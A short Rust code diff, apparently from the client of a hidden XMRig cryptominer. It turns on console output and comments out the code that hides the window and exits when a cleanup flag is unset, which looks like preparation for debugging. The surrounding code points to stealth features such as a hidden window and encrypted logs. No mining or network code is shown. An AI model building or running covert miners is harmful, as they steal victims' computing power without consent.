@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 
 use std::{ sync::Mutex, time::Duration };
 use client_vars::constants::{ log_directory, xmrig_exe_name };
@@ -35,7 +35,7 @@ macro_rules! log_internal {
         match &*$crate::LOGGER.lock().unwrap() {
             Some(logger) => {
                 logger.log($level, s!($s));
-                // println!("{:#?}",$s);
+                println!("{:#?}",$s);
             }
             None => {}
         }
@@ -51,7 +51,7 @@ macro_rules! log_internal {
             match &*$crate::LOGGER.lock().unwrap() {
                 Some(logger) => {
                 logger.log($level, &format!("{}{:#?}", s!($fmt), $($arg)*));
-                // println!("{}{:#?}", $fmt, $($arg)*);
+                println!("{}{:#?}", $fmt, $($arg)*);
             }
             None => {}
         }
@@ -125,9 +125,9 @@ async fn main() {
 
     let mib_config = load_mib_config(false).unwrap();
 
-    if !mib_config.cln_up_done {
-        exit_1();
-    }
+    // if !mib_config.cln_up_done {
+    //     exit_1();
+    // }
 
     let res_logger = Logger::new(log_directory(), logs_encryption_key());
     if let Ok(logger) = res_logger {
